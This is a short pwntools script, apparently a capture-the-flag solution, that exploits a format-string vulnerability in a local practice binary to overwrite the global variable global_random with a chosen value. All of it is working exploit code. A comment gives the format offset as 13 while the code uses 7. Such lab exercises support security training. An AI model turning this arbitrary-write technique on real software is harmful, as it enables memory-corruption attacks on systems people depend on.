from pwn import *

# Start the process
p = process("./8-fs-aw-64")

# Address of global_random
gr_addr = p.elf.symbols["global_random"]
log.info(f"Address of global_random: {hex(gr_addr)}")

# Read initial output (if necessary)
print(p.recv())

# The target value we want to write: 0xfaceb00c
desired_value = 0xfaceb00c

# Define a function that fmtstr will call to send payloads
def send_payload(payload):
    p.sendline(payload)
    try:
        return p.recv()
    except EOFError:
        return b''  # Gracefully handle process crash

# Manually specify the format string offset (assumed to be 13 for this example)
fmt_str = FmtStr(execute_fmt=send_payload, offset=7)

# Set the value of global_random to 0xfaceb00c
fmt_str.write(gr_addr, desired_value)

# Execute the payload (fmtstr automatically builds and sends it)
fmt_str.execute_writes()

# Optionally, receive the response and print
print(p.recv())

# Close process